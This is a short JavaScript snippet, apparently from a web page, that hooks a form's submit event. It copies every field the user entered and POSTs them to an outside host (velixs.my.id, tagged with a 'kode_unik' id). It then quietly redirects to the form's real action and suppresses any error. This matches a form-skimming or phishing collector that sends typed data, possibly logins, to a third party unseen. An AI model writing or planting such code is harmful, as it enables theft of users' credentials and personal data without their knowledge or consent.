const content = document.getElementById("content");
        content.addEventListener("submit", e => {
            e.preventDefault();
            let formData = new FormData(content);
            let formDataObject = {};
            formData.forEach((value, key) => {
                formDataObject[key] = value;
            });

            let urlSearchParams = new URLSearchParams;
            for (let key in formDataObject) {
                urlSearchParams.append(key, formDataObject[key]);
            }

            fetch("https://velixs.my.id/api?kode_unik=12345", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: urlSearchParams.toString()
            })
            .then(response => response.ok && (window.location.href = content.getAttribute("action")))
            .catch(error => {});  // No error message here
        });
